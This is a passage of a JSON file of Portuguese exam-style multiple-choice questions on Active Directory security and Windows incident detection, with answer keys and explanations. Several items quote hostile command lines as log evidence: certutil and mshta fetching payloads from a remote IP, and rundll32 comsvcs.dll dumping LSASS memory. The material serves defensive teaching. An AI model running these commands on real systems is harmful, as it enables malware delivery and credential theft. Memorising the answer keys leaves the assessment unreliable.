    "explanation": "Um golden ticket é um TGT forjado assinado com um hash da palavra-passe do krbtgt. O AD lembra as chaves krbtgt actual e anterior para desencriptar tickets, por isso uma só reposição ainda deixa a chave antiga válida. Repor duas vezes (à espera da replicação após cada uma) reformula as duas chaves e invalida tickets forjados com qualquer delas. Não se trata de apagar/recriar a conta, de cache no LSASS entre reboots, nem de uma terceira reposição obrigatória em todas as florestas.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "5.3"
  },
  {
    "question": "Porque é que os guias de hardening do Active Directory recomendam que os admins de domínio trabalhem a partir de uma Privileged Access Workstation (PAW)?",
    "options": [
      "Porque um equipamento dedicado e trancado, usado só para tarefas de administração, mantém as credenciais privilegiadas longe de máquinas que navegam na web ou lêem email",
      "Porque a PAW guarda todas as palavras-passe de admin no TPM, por isso os controladores de domínio deixam de aceitar logons NTLM e Kerberos vindos de qualquer outro cliente",
      "Porque a PAW substitui o controlador de domínio nas janelas de manutenção, deixando os admins mudar Group Policy sem replicar as alterações para os DC reais",
      "Porque o Windows só permite alterar o grupo Domain Admins a partir de uma máquina cujo nome comece por PAW, o que impede atacantes remotos de o editar"
    ],
    "correct": 0,
    "explanation": "Uma PAW é uma estação de trabalho endurecida reservada à administração privilegiada, sem email, navegação nem aplicações gerais. Se os admins só iniciarem sessão aí, as credenciais de alto valor nunca ficam expostas em máquinas do dia-a-dia onde phishing ou malware as possam roubar. Não move palavras-passe para o TPM para mudar a forma como os DC aceitam logons, não funciona como DC e não há regra de nome de máquina.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "1.9"
  },
  {
    "question": "O que é que o PowerShell Just Enough Administration (JEA) oferece principalmente num servidor Windows?",
    "options": [
      "Uma política de scripts assinados que recusa qualquer comando PowerShell que não tenha sido escrito por um admin de domínio, dispensando contas de administrador separadas",
      "Uma elevação temporária que junta o utilizador ao grupo Administrators local durante uma hora e depois termina a sessão, dando uma shell de admin completa nesse período",
      "Um endpoint de remoting limitado onde o utilizador só corre os cmdlets e parâmetros de uma role capability, muitas vezes através de uma conta virtual temporária",
      "Um substituto do WinRM que encaminha o PowerShell por SMB, para a administração remota funcionar mesmo com a Firewall do Windows a bloquear as portas TCP 5985 e 5986"
    ],
    "correct": 2,
    "explanation": "O JEA publica um endpoint de remoting PowerShell cujas role capabilities indicam exactamente que cmdlets, funções e parâmetros cada grupo pode usar. Os comandos correm normalmente com uma conta virtual temporária ou uma conta gerida de grupo, por isso o helpdesk pode, por exemplo, reiniciar um serviço sem ser admin local. Não é uma política de assinatura, não é uma entrada temporária no grupo Administrators e continua a usar WinRM.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.2"
  },
  {
    "question": "No Active Directory activas o Kerberos armoring (FAST, Flexible Authentication Secure Tunneling) nos clientes e DC. O que é que acrescenta principalmente?",
    "options": [
      "Substitui RC4 e AES por uma cifra pós-quântica em todos os service tickets, por isso os hashes de Kerberoasting deixam de poder ser partidos offline para qualquer conta",
      "Envolve a troca AS num canal com chave do ticket do próprio computador, para a pré-autenticação não ser partida offline nem os erros forjados",
      "Obriga todos os utilizadores a apresentar um smart card antes de receberem um TGT, por isso os logons com palavra-passe falham em todas as máquinas do domínio",
      "Impede os DC de emitir TGTs a contas em Protected Users e, em vez disso, emite service tickets de curta duração directamente do KDC em cada logon"
    ],
    "correct": 1,
    "explanation": "O FAST cria um túnel blindado para a troca AS-REQ/AS-REP usando uma chave do TGT da conta de computador. Isso protege os dados de pré-autenticação do utilizador contra adivinhação offline da palavra-passe, permite ao KDC enviar erros assinados que não podem ser forjados e suporta compound claims para o Dynamic Access Control. Não muda as cifras dos service tickets, não exige smart cards e não altera a forma como as contas Protected Users recebem TGTs.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "identidade",
    "domain": "1.5"
  },
  {
    "question": "Uma equipa de segurança ativa a regra Attack Surface Reduction (ASR) do Microsoft Defender 'Block all Office applications from creating child processes'. Que ataque é que esta regra trava principalmente?",
    "options": [
      "Páginas de phishing que copiam o ecrã de início de sessão do Microsoft 365, porque a regra verifica cada link de um documento Office numa lista de sites falsos",
      "Uma macro maliciosa num ficheiro Word que lança PowerShell ou cmd.exe para descarregar e correr a fase seguinte",
      "Ransomware que cifra documentos Office em partilhas, porque a regra torna os ficheiros .docx e .xlsx só de leitura para todos os processos exceto as apps Office",
      "Atacantes que roubam chaves de licença do Office do registo, porque a regra impede outros processos de ler as chaves de registo da instalação do Office"
    ],
    "correct": 1,
    "explanation": "Muitas campanhas de malware começam com um documento cuja macro ou exploit faz o Word ou o Excel lançar PowerShell, cmd.exe, wscript ou outro binário para ir buscar o payload. Esta regra ASR impede as apps Office de criar processos filhos, partindo essa cadeia mesmo que o utilizador ative as macros. Não filtra links de phishing, não protege ficheiros contra ransomware (isso é o Controlled Folder Access) e não tem nada a ver com chaves de licença.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.1"
  },
  {
    "question": "Porque é que os guias de hardening de Active Directory tratam ser membro do grupo integrado Backup Operators nos controladores de domínio como quase igual a Domain Admin?",
    "options": [
      "Porque os Backup Operators são adicionados automaticamente ao grupo Enterprise Admins em cada backup agendado, e assim podem alterar o schema da floresta",
      "Porque o grupo pode repor a palavra-passe de qualquer conta, incluindo a conta krbtgt, sem que essa alteração fique escrita no registo de segurança",
      "Porque os membros podem entrar em todos os postos como a conta local SYSTEM, o que lhes permite desativar o Microsoft Defender em todas as máquinas",
      "Porque o SeBackupPrivilege lhes permite ler o NTDS.dit e as hives do registo, e assim extrair todos os hashes de palavras-passe do domínio"
    ],
    "correct": 3,
    "explanation": "Os Backup Operators têm SeBackupPrivilege e SeRestorePrivilege e podem iniciar sessão nos controladores de domínio. O privilégio de backup passa por cima das ACLs dos ficheiros, por isso um membro pode copiar o NTDS.dit (por exemplo de uma shadow copy) e a hive SYSTEM e depois extrair offline os hashes de todas as contas, krbtgt incluída. Por isso o grupo pertence ao Tier 0 e normalmente deve estar vazio. Não entra nos Enterprise Admins, não repõe palavras-passe às escondidas nem dá SYSTEM nos postos.",
    "difficulty": "Difícil",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.1"
  },
  {
    "question": "Num controlador de domínio, que padrão de registos é um sinal comum de Kerberoasting num ambiente que normalmente usa AES no Kerberos?",
    "options": [
      "Muitos eventos 4769 (pedido de ticket de serviço) de um utilizador para várias contas de serviço com tipo de cifra 0x17 (RC4)",
      "Muitos eventos 4625 (início de sessão falhado) para uma conta a partir de muitos IPs de origem em poucos minutos, seguidos do bloqueio dessa conta",
      "Evento 4720 (conta de utilizador criada) para uma conta com nome parecido com um serviço, seguida da adição dessa conta aos Domain Admins",
      "Evento 1102 (registo de auditoria limpo) no controlador de domínio logo depois de um servidor membro reiniciar fora da janela de manutenção"
    ],
    "correct": 0,
    "explanation": "No Kerberoasting o atacante pede ao KDC tickets de serviço para contas com SPN e quebra-os offline; pedir RC4 torna a quebra muito mais rápida. Num DC isto aparece como evento 4769 com Ticket Encryption Type 0x17, muitas vezes uma rajada de um utilizador para muitos SPNs. Rajadas de 4625 apontam para password spraying ou força bruta, 4720 com mudanças de grupo para persistência, e 1102 para alguém a apagar rastos.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Um analista suspeita de movimento lateral ao estilo PsExec para um servidor de ficheiros. Que registo nesse servidor é o sinal clássico?",
    "options": [
      "Evento 4740 (conta de utilizador bloqueada) para a conta de administrador, porque o PsExec tenta sempre várias palavras-passe erradas antes de entrar",
      "Evento 5156 (ligação permitida pela Windows Filtering Platform) na porta 3389, porque o PsExec abre uma sessão Remote Desktop escondida no alvo",
      "Evento de sistema 7045 (serviço instalado), por exemplo um novo serviço PSEXESVC, normalmente logo após um logon de rede (4624 tipo 3)",
      "Evento 4800 (estação bloqueada) para o utilizador com sessão aberta, porque o PsExec bloqueia a consola para o utilizador não ver os comandos"
    ],
    "correct": 2,
    "explanation": "O PsExec copia um binário de serviço para a partilha ADMIN$ do alvo e cria um serviço (PSEXESVC por omissão) para correr comandos, por isso o alvo regista o evento de sistema 7045, mais o evento de segurança 4697 se a auditoria estiver ativa, junto a um logon de rede tipo 3 vindo da origem. Serviços com outro nome mostram o mesmo padrão. O PsExec usa SMB na porta 445, não RDP, e não precisa de logons falhados nem bloqueia a consola.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Atacantes numa rede correm PowerShell muito ofuscado (Base64 e concatenação de strings). Que funcionalidade de registo do Windows mostra melhor aos defensores o código que correu de facto?",
    "options": [
      "Só a transcrição do PowerShell, porque guarda uma cópia exata da linha de comandos Base64 escrita na consola num ficheiro de texto no perfil",
      "O Script Block Logging do PowerShell, que escreve o evento 4104 com os blocos de script tal como correram, já sem grande parte da ofuscação",
      "O registo da Firewall do Windows com pacotes descartados, porque cada comando PowerShell cria uma ligação de rede que depois fica no registo",
      "A auditoria de logons nos controladores de domínio, porque cada comando PowerShell é validado pelo Kerberos e aparece em eventos 4768"
    ],
    "correct": 1,
    "explanation": "O Script Block Logging (evento 4104 em Microsoft-Windows-PowerShell/Operational) regista o código de cada bloco de script quando o PowerShell o compila, por isso Base64 ou strings concatenadas aparecem já descodificadas, e o Windows regista automaticamente blocos com ar suspeito mesmo com a política desligada. A transcrição é útil mas guarda a entrada e saída da consola, não o script descodificado. Os registos da firewall e de logons Kerberos não contêm o código PowerShell.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Num posto com Sysmon, que evento é o sinal mais direto de que uma ferramenta como o Mimikatz está a tentar ler credenciais da memória?",
    "options": [
      "Sysmon Event ID 3 (ligação de rede) do lsass.exe para um IP externo, porque o Mimikatz faz o LSASS enviar os hashes para o servidor do atacante",
      "Sysmon Event ID 11 (ficheiro criado) de um ficheiro .kirbi em C:\\Windows\\System32, porque o Mimikatz tem de escrever lá cada ticket antes de ler hashes",
      "Sysmon Event ID 7 (imagem carregada) a mostrar o lsass.exe a carregar o ntdll.dll, porque o LSASS só carrega essa biblioteca quando há uma ferramenta ligada",
      "Sysmon Event ID 10 (acesso a processo) com o lsass.exe como alvo e uma máscara de acesso como 0x1010 vinda de um processo invulgar"
    ],
    "correct": 3,
    "explanation": "As ferramentas que extraem credenciais abrem um handle para o lsass.exe com direitos de leitura de memória. O Sysmon Event ID 10 (ProcessAccess) regista o processo de origem, o alvo e a máscara GrantedAccess, e máscaras como 0x1010 ou 0x1410 vindas de um processo que não tem nada a ver com o LSASS são uma deteção clássica. O LSASS não envia hashes pela rede, os ficheiros .kirbi são exportações opcionais de tickets guardadas onde o atacante quiser e todos os processos carregam o ntdll.dll.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "A conta de domínio de um utilizador bloqueia de poucos em poucos minutos, mesmo depois de mudar a password. Onde procuras primeiro para descobrir que máquina está a enviar as passwords erradas?",
    "options": [
      "No evento 4625 do portátil do próprio utilizador, porque cada logon falhado fica registado só no computador onde o utilizador está",
      "No evento 4740 do controlador de domínio com o papel de PDC emulator, cujo campo Caller Computer Name mostra de onde veio o bloqueio",
      "No evento 4720 de qualquer controlador de domínio, porque a conta é recriada sempre que bloqueia e o evento indica o host de origem",
      "No evento 4624 do servidor de ficheiros, porque um bloqueio é registado como logon bem-sucedido do tipo 3 vindo do computador culpado"
    ],
    "correct": 1,
    "explanation": "As tentativas com password errada são reencaminhadas para o PDC emulator, que bloqueia a conta e regista o evento 4740 com o Caller Computer Name. Esse host costuma ter uma password antiga guardada: uma unidade mapeada, a app de email de um telemóvel, uma tarefa agendada ou um serviço. Se precisares, segue com as falhas 4771 ou 4776 nos DCs. O 4625 é um logon falhado na máquina de destino, o 4720 é a criação de uma conta e o 4624 é um logon com sucesso.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Suspeitas de um ataque DCSync. Com a auditoria de Directory Service Access ligada, que evento do controlador de domínio mostra isso melhor?",
    "options": [
      "O evento 4769 para o serviço krbtgt vindo de um posto, porque o DCSync pede ao KDC um ticket de serviço por cada conta que quer copiar",
      "O evento 5136 a mostrar que o objeto raiz do domínio foi alterado, porque o DCSync escreve primeiro os hashes roubados num atributo dele",
      "O evento 4662 no objeto do domínio com o direito DS-Replication-Get-Changes-All, feito por uma conta ou host que não é controlador de domínio",
      "O evento 4740 para muitas contas de uma vez, porque o DCSync tira cada password a tentar logons até o controlador de domínio bloquear a conta"
    ],
    "correct": 2,
    "explanation": "O DCSync usa o protocolo de replicação do diretório (MS-DRSR) para pedir dados de passwords a um DC, como faria um DC verdadeiro. Com a auditoria ligada, o DC regista o 4662 no objeto do domínio com os direitos de replicação Get-Changes (1131f6aa-...) e Get-Changes-All (1131f6ad-...). Só os DCs, e às vezes ferramentas como o Azure AD Connect, devem fazer isso, por isso o mesmo pedido vindo de uma conta de utilizador ou de um posto é um forte sinal. O DCSync não altera objetos, não pede tickets do krbtgt nem causa bloqueios.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "À procura de AS-REP roasting, que detalhe nos registos do controlador de domínio é a pista mais forte?",
    "options": [
      "O evento 4768 com Pre-Authentication Type 0 para contas com 'Do not require Kerberos preauthentication' ativo, vindo de um host invulgar",
      "O evento 4769 com encriptação de ticket 0x17 para uma conta de serviço, porque o AS-REP roasting pede sempre tickets de serviço RC4 ao KDC",
      "O evento 4624 com logon do tipo 10 no controlador de domínio, porque o AS-REP roasting precisa de uma sessão RDP interativa ao KDC",
      "O evento 4625 com estado 0xC000006A para muitos utilizadores, porque o AS-REP roasting adivinha passwords online até um logon funcionar"
    ],
    "correct": 0,
    "explanation": "No AS-REP roasting o atacante pede um TGT para contas que não precisam de pré-autenticação Kerberos; o KDC responde com dados cifrados com a chave do utilizador, que depois são quebrados offline. O DC regista o 4768 com Pre-Authentication Type 0. Encontra essas contas com PowerShell (DoesNotRequirePreAuth) e desliga a opção. O 4769 com 0x17 aponta para Kerberoasting, e o ataque não precisa de RDP nem de adivinhar passwords online.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Numa workstation encontras o evento 4698 às 03:12, criado por uma conta de utilizador que nunca entra à noite. O novo item corre o powershell.exe com um comando codificado de 15 em 15 minutos. O que é que isto mostra, muito provavelmente?",
    "options": [
      "Uma verificação normal do Windows Update, porque o Windows agenda as pesquisas de atualizações com PowerShell codificado à noite",
      "Uma tentativa de logon falhada, porque o 4698 regista uma password errada e o comando codificado é o hash do que foi escrito",
      "A mudança da password de um utilizador, porque o 4698 é escrito quando corre uma reposição e mostra o script que a alterou",
      "Persistência através de uma nova tarefa agendada, já que o 4698 indica a criação de uma; revê o XML no evento e remove-a"
    ],
    "correct": 3,
    "explanation": "O evento 4698 é registado quando uma tarefa agendada é criada (com a auditoria Other Object Access Events ligada) e inclui o XML da tarefa com a ação que corre. Uma tarefa criada de noite por uma conta invulgar que lança PowerShell codificado de poucos em poucos minutos é uma técnica clássica de persistência. As tarefas do Windows Update são tarefas de sistema assinadas, os logons falhados são o 4625 e as reposições de password o 4724.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "O EDR alerta que HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential foi posto a 1 num servidor Windows 10. Porque é que isto é um sinal de alarme sério?",
    "options": [
      "Ativa o NTLMv2 no servidor, que já é o padrão, por isso o alerta é um falso positivo deixado por uma baseline de segurança antiga",
      "Desliga a proteção em tempo real do Windows Defender, para o malware poder ser copiado para o servidor sem ser analisado",
      "Faz o LSASS guardar outra vez as passwords em texto claro após o próximo logon, e um credential dumper consegue lê-las",
      "Obriga todos os utilizadores a mudar a password no próximo logon, o que os atacantes usam para trancar os administradores fora"
    ],
    "correct": 2,
    "explanation": "Desde o Windows 8.1 e o Server 2012 R2, o WDigest deixou de guardar credenciais em texto claro no LSASS. Pôr o UseLogonCredential a 1 volta a ligar isso, por isso, depois de os utilizadores entrarem outra vez, uma ferramenta como o Mimikatz consegue extrair as passwords em texto claro. Os atacantes alteram-no para preparar o roubo de credenciais. Alerta para a mudança, repõe o 0 e procura acessos ao LSASS. Não tem nada a ver com o NTLMv2, o Defender ou mudanças forçadas de password.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "endpoint",
    "domain": "3.5"
  },
  {
    "question": "Os registos de processos de um PC mostram: certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.exe. Ninguém da equipa de IT gere certificados nesse PC. Como deves interpretar isto?",
    "options": [
      "Uma verificação normal de revogação de certificados, porque o certutil descarrega CRLs por HTTP e grava-as como .exe em Public",
      "Uma ferramenta do Windows usada para descarregar um ficheiro da internet, um truque living-off-the-land; isola e analisa o a.exe",
      "Uma reparação do Windows Update, porque o certutil vai buscar ficheiros de sistema novos e guarda-os na pasta Public para instalar",
      "Uma limpeza de cache inofensiva, porque o -urlcache apaga downloads antigos e o -split -f só divide o registo em partes mais pequenas"
    ],
    "correct": 1,
    "explanation": "O certutil é um binário assinado do Windows para certificados, mas '-urlcache -split -f <url> <ficheiro>' põe-no a descarregar qualquer ficheiro. Os atacantes usam-no para trazer payloads sem precisarem de um downloader próprio, por isso é um LOLBin bem conhecido. Um .txt vindo de um IP direto e gravado como .exe em C:\\Users\\Public é um forte sinal de preparação de malware: isola o host, recolhe o ficheiro e verifica o hash. As verificações de CRL não gravam executáveis e o Windows Update não usa o certutil.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Durante a investigação de um servidor de ficheiros, o registo Security começa hoje às 02:47 com o evento 1102 e não há nada mais antigo. Nenhum administrador tinha manutenção planeada. O que é que isto te diz?",
    "options": [
      "O registo só chegou ao tamanho máximo e o Windows começou um ficheiro novo, que escreve sempre o 1102 como primeiro evento",
      "Alguém limpou de propósito o registo Security, muitas vezes para esconder rastos; descobre quem foi e vê as cópias no SIEM",
      "O servidor foi atualizado e reiniciado durante a noite, e o 1102 é o evento normal de arranque escrito pelo serviço Event Log",
      "Uma tarefa de backup arquivou as entradas antigas em fita, e o 1102 marca onde o arquivo termina para o backup continuar depois"
    ],
    "correct": 1,
    "explanation": "O evento 1102 significa que o registo de auditoria foi limpo e indica a conta que o fez. Sem trabalho planeado, um registo Security apagado é um passo clássico de anti-forense, por isso verifica que conta o limpou e consulta as cópias já enviadas para o SIEM ou para um coletor de registos. Um registo cheio ou escreve por cima dos eventos antigos ou arquiva-os sem 1102, e o arranque dos serviços fica registado com outros eventos no registo System.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.4"
  },
  {
    "question": "O Sysmon mostra isto num servidor: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Temp\\d.bin full. O processo 712 é o lsass.exe. Como deves tratar isto?",
    "options": [
      "Como um relatório de falha normal, porque o Windows Error Reporting usa o comsvcs.dll para guardar um dump quando o LSASS bloqueia",
      "Como uma reparação inofensiva do COM+, porque o comsvcs.dll reconstrói o catálogo COM+ e guarda a cópia antiga em C:\\Temp",
      "Como roubo de credenciais: uma DLL do sistema serve para extrair a memória do LSASS; isola o host e repõe as contas expostas",
      "Como uma verificação de memória normal do Defender, que chama o rundll32 com o comsvcs.dll para analisar processos protegidos"
    ],
    "correct": 2,
    "explanation": "O comsvcs.dll exporta uma função MiniDump e, chamada pelo rundll32 com o ID do processo LSASS, grava um dump completo da memória do LSASS. Ferramentas como o Mimikatz conseguem depois tirar desse ficheiro hashes de passwords e tickets Kerberos offline. É uma técnica living-off-the-land bem conhecida, por isso isola o host, considera expostas as credenciais de quem tinha sessão aberta e liga a proteção LSA (RunAsPPL) e o Credential Guard. O Windows Error Reporting usa as suas próprias ferramentas e o Defender não analisa através do rundll32.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Num controlador de domínio vês o evento 4720 para uma conta nova 'svc_backup2' às 23:40 e, dois minutos depois, o evento 4732 a adicioná-la ao grupo local Administrators. Ninguém abriu um pedido para isso. Qual é a leitura certa?",
    "options": [
      "Uma provável conta de administrador backdoor; vê quem a criou, desativa-a e revê o que ela fez",
      "Uma conta de serviço normal criada pelo Windows Server Backup, que cria contas svc_ sozinho quando corre a primeira tarefa",
      "Um password spray falhado, porque o 4720 e o 4732 são escritos sempre que um atacante tenta um novo nome de utilizador no DC",
      "Uma limpeza automática de contas antigas, porque o 4720 marca uma conta a ser arquivada e o 4732 move-a para um grupo seguro"
    ],
    "correct": 0,
    "explanation": "O evento 4720 significa que foi criada uma conta de utilizador e o 4732 que foi adicionado um membro a um grupo local com segurança ativa, aqui o Administrators. Uma conta nova com nível de administrador criada à noite sem pedido de alteração é uma jogada típica de persistência, por isso encontra o criador nos detalhes do evento, desativa a conta e verifica os logons e as ações dela. O Windows Server Backup não cria contas, o password spraying aparece como logons falhados como o 4625 ou o 4771, e nenhum dos eventos tem a ver com arquivo.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Em dez minutos um controlador de domínio regista o evento 4771 com código de falha 0x18 para 300 contas diferentes, uma ou duas tentativas cada, todas a partir do IP do mesmo posto. Qual é a atividade mais provável?",
    "options": [
      "Um dia normal de mudança de palavra-passe, em que a política do domínio obriga todos a escrever uma nova no próximo login",
      "Desvio do relógio no posto, que faz o Kerberos recusar todos os tickets até a hora voltar a estar certa com o domínio",
      "Password spraying por Kerberos: poucas palavras-passe comuns testadas em muitas contas para fugir ao bloqueio",
      "Uma unidade de rede mapeada avariada no posto, que repete em ciclo a palavra-passe guardada para cada utilizador do PC"
    ],
    "correct": 2,
    "explanation": "O evento 4771 é uma falha de pré-autenticação Kerberos e o código 0x18 indica palavra-passe errada. Muitas contas com só uma ou duas tentativas cada, vindas de uma única origem, é o padrão de password spraying, que fica abaixo do limite de bloqueio. O desvio de relógio aparece como código 0x25, um dia de mudança de palavra-passe não vem de um só IP e uma unidade mapeada presa repete uma conta, não centenas.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "O EDR mostra o WINWORD.EXE a arrancar 'mshta.exe http://203.0.113.50/inv.hta' no portátil de um utilizador, seguido de um processo PowerShell com um comando codificado. Qual é a melhor leitura e a primeira resposta?",
    "options": [
      "O Word está a descarregar uma atualização de modelo pelo mshta, o que é normal; permite e junta o IP à lista branca do proxy",
      "Uma macro usou o LOLBin mshta para correr um HTA remoto; isola o portátil e bloqueia o IP e esse processo filho do Office",
      "O utilizador abriu um ficheiro de ajuda no Word e o mshta é o visualizador de ajuda HTML; pede-lhe para fechar o Word e repetir",
      "O PowerShell depois do mshta é o Windows a verificar a assinatura do ficheiro, por isso espera que o Defender acabe de analisar o HTA"
    ],
    "correct": 1,
    "explanation": "O mshta.exe corre HTML Applications com plenos direitos de script, e um HTA remoto lançado pelo Word seguido de PowerShell codificado é uma cadeia clássica de macro maliciosa. Isola o equipamento, bloqueia o endereço e ativa a regra ASR que impede as apps do Office de criar processos filho. Os modelos do Word não vêm pelo mshta, o visualizador de ajuda é o hh.exe e a verificação de assinaturas não lança PowerShell.",
    "difficulty": "Difícil",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "5.3"
  },
  {
    "question": "Num servidor de ficheiros, o evento 4648 mostra que o utilizador dos RH 'mrosa' correu um processo com as credenciais explícitas de 'adm-backup', um Domain Admin, e depois ligou-se ao C$ de dez servidores em poucos minutos. O que deve concluir o analista?",
    "options": [
      "O evento 4648 aparece em todos os logins normais, por isso um utilizador comum usar um nome de admin é esperado e não exige nada",
      "O serviço de backup corre de propósito com o utilizador dos RH, porque os backups começam sempre na conta mais usada",
      "O Windows mudou o utilizador para a conta de admin sozinho depois de um aviso UAC, e essa conta abriu as partilhas por si",
      "Uma sessão dos RH nunca deve ter credenciais de Domain Admin; trata como possível roubo de credenciais e movimento lateral"
    ],
    "correct": 3,
    "explanation": "O evento 4648 regista um login tentado com credenciais explícitas, como no runas ou no 'net use /user'. Um utilizador dos RH a usar uma conta Domain Admin e a mexer em partilhas administrativas de vários servidores aponta para credenciais roubadas usadas em movimento lateral. Desativa ou repõe a 'adm-backup', delimita os equipamentos onde chegou e verifica o portátil dos RH. O 4648 não é escrito em todos os logins, os serviços de backup não correm em sessões de utilizador e o UAC nunca te troca para outra conta.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Que opção lista as três propriedades da tríade CIA?",
    "options": [
      "Confidencialidade, Integridade, Disponibilidade",
      "Controlo, Identidade, Acesso sem ferramentas adicionais",
      "Conformidade, Isolamento, Auditoria",
      "Criptografia, Integridade, Autorização"
    ],
    "correct": 0,
    "explanation": "A tríade CIA é Confidencialidade, Integridade e Disponibilidade, os três objetivos centrais que os controlos de segurança protegem.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "1.1"
  },
  {
    "question": "Qual é a ideia principal de uma estratégia de defesa em profundidade?",
    "options": [
      "Confiar numa única firewall de perímetro forte para toda a proteção",
      "Usar vários controlos em camadas para que uma falha não exponha tudo",
      "Cifrar todos os dados e ignorar os controlos de acesso físico",
      "Dar direitos de administrador a todos os utilizadores para facilitar o suporte"
    ],
    "correct": 1,
    "explanation": "A defesa em profundidade empilha controlos independentes (rede, host, aplicação, físico, política) para que a falha de uma camada não comprometa todo o sistema.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "1.1"
  },
  {
    "question": "Uma mensagem leva um colaborador a deixar um desconhecido entrar atrás de si por uma porta com cartão. Que ataque é este?",
    "options": [
      "Tailgating (seguir atrás)",
      "Smishing em parques de vários fabricantes",
      "Injeção de SQL",
      "Envenenamento de DNS"
    ],
    "correct": 0,
    "explanation": "O tailgating (ou piggybacking) é um ataque físico de engenharia social em que o atacante entra atrás de uma pessoa autorizada por uma porta segura.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Um SMS diz que o seu cartão bancário está bloqueado e pede para tocar num link para o desbloquear. Como se chama esta técnica?",
    "options": [
      "Vishing",
      "Smishing",
      "Whaling",
      "Watering hole"
    ],
    "correct": 1,
    "explanation": "O smishing é phishing feito por mensagens SMS; o vishing usa chamadas de voz e o whaling tem como alvo executivos.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "O que descreve melhor uma Ameaça Persistente Avançada (APT)?",
    "options": [
      "Uma análise automática pontual de hosts aleatórios da Internet",
      "Um atacante furtivo e com muitos recursos que mantém acesso prolongado a um alvo",
      "Uma má configuração inofensiva encontrada numa auditoria na maioria dos ambientes de produção",
      "Um vírus antigo que só se espalha por disquetes no dia a dia das operações"
    ],
    "correct": 1,
    "explanation": "Uma APT é um adversário capaz e bem financiado (muitas vezes ligado a um Estado) que obtém e mantém acesso encoberto e prolongado a um alvo específico.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "O que é uma botnet?",
    "options": [
      "Uma rede de backup mantida offline para recuperação",
      "Uma rede de dispositivos comprometidos controlados remotamente por um atacante",
      "Um cluster de firewalls que equilibra o tráfego na maioria dos ambientes de produção",
      "Um protocolo para cifrar o correio em trânsito sem ferramentas adicionais"
    ],
    "correct": 1,
    "explanation": "Uma botnet é um conjunto de máquinas infetadas (bots) controladas por um atacante, usadas tipicamente para DDoS, spam ou credential stuffing.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "No AAA, que parte decide O QUE um utilizador autenticado pode fazer?",
    "options": [
      "Autenticação",
      "Autorização",
      "Contabilização",
      "Associação"
    ],
    "correct": 1,
    "explanation": "A Autenticação prova quem é, a Autorização decide o que pode fazer e a Contabilização regista o que foi feito.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "identidade",
    "domain": "1.3"
  },
  {
    "question": "Porque é que o RADIUS é muito usado no controlo de acesso à rede?",
    "options": [
      "Centraliza a autenticação para que os equipamentos não guardem contas locais",
      "Cifra todos os volumes de disco nos endpoints",
      "Dispensa a necessidade de regras de firewall na maioria dos ambientes de produção",
      "É um protocolo de encaminhamento para escolher o melhor caminho"
    ],
    "correct": 0,
    "explanation": "O RADIUS centraliza o AAA para que switches, Wi-Fi e VPNs validem os utilizadores contra um servidor único em vez de contas locais em cada equipamento.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "identidade",
    "domain": "1.3"
  },
  {
    "question": "Qual é o melhor exemplo de autenticação multifator (MFA)?",
    "options": [
      "Uma password longa mudada todos os meses segundo a prática comum",
      "Uma password mais um código de uma app de autenticação",
      "Duas passwords diferentes para a mesma conta",
      "Um nome de utilizador difícil de adivinhar"
    ],
    "correct": 1,
    "explanation": "O MFA combina fatores de tipos diferentes; uma password (algo que se sabe) mais um código de app (algo que se tem) conta, duas passwords não.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "identidade",
